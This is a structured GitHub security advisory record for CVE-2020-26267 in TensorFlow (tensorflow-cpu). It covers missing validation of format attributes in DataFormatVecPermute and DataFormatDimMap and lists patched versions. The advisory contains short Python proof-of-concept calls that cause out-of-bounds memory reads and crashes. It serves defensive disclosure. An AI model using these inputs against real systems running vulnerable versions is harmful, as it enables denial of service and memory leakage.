{
  "Severity": "LOW",
  "UpdatedAt": "2020-12-10T19:05:10Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "tensorflow-cpu"
  },
  "Advisory": {
    "DatabaseId": 3226,
    "Id": "MDE2OlNlY3VyaXR5QWR2aXNvcnlHSFNBLWM5ZjMtOXdmci13Z2g3",
    "GhsaId": "GHSA-c9f3-9wfr-wgh7",
    "References": [
      {
        "Url": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7"
      },
      {
        "Url": "https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26267"
      },
      {
        "Url": "https://github.com/advisories/GHSA-c9f3-9wfr-wgh7"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-c9f3-9wfr-wgh7"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2020-26267"
      }
    ],
    "Description": "### Impact\nThe `tf.raw_ops.DataFormatVecPermute` API does not validate the `src_format` and `dst_format` attributes. [The code](https://github.com/tensorflow/tensorflow/blob/304b96815324e6a73d046df10df6626d63ac12ad/tensorflow/core/kernels/data_format_ops.cc) assumes that these two arguments define a permutation of `NHWC`.\n\nHowever, these assumptions are not checked and this can result in uninitialized memory accesses, read outside of bounds and even crashes.\n\n```python\n\u003e\u003e\u003e import tensorflow as tf\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='1234', dst_format='1234')\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 757100143], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='HHHH', dst_format='WWWW')\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,4], src_format='H', dst_format='W')\n\u003ctf.Tensor: shape=(2,), dtype=int32, numpy=array([4, 32701], dtype=int32)\u003e\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], \n                                    src_format='1234', dst_format='1253')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 2, 939037184, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format='1234', dst_format='1223')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 32701, 2, 3], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format='1224', dst_format='1423')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([1, 4, 3, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4], src_format='1234', dst_format='432')\n\u003ctf.Tensor: shape=(4,), dtype=int32, numpy=array([4, 3, 2, 32701], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[1,2,3,4],\n                                    src_format='12345678', dst_format='87654321')\nmunmap_chunk(): invalid pointer\nAborted\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]],           \n                                    src_format='12345678', dst_format='87654321')\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[71364624,        0],\n       [71365824,        0],\n       [     560,        0],\n       [      48,        0]], dtype=int32)\u003e\n...\n\u003e\u003e\u003e tf.raw_ops.DataFormatVecPermute(x=[[1,5],[2,6],[3,7],[4,8]], \n                                    src_format='12345678', dst_format='87654321')\nfree(): invalid next size (fast)\nAborted\n```\n\nA similar issue occurs in `tf.raw_ops.DataFormatDimMap`, for the same reasons:\n\n```python\n\u003e\u003e\u003e tf.raw_ops.DataFormatDimMap(x=[[1,5],[2,6],[3,7],[4,8]], src_format='1234',\n\u003e\u003e\u003e dst_format='8765')\n\u003ctf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [1852793632, 1852793632]], dtype=int32)\u003e\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ebc70b7a592420d3d2f359e4b1694c236b82c7ae](https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae) and will release TensorFlow 2.4.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\nSince this issue also impacts TF versions before 2.4, we will patch all releases between 1.15 and 2.3 inclusive.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2020-12-10T19:07:26Z",
    "Severity": "LOW",
    "Summary": "Lack of validation in data format attributes in TensorFlow",
    "UpdatedAt": "2023-02-01T05:05:03Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 4.4,
      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "2.3.2"
      },
      "VulnerableVersionRange": "\u003e= 2.3.0, \u003c 2.3.2"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.2.2"
      },
      "VulnerableVersionRange": "\u003e= 2.2.0, \u003c 2.2.2"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.1.3"
      },
      "VulnerableVersionRange": "\u003e= 2.1.0, \u003c 2.1.3"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.0.4"
      },
      "VulnerableVersionRange": "\u003e= 2.0.0, \u003c 2.0.4"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "1.15.5"
      },
      "VulnerableVersionRange": "\u003c 1.15.5"
    }
  ]
}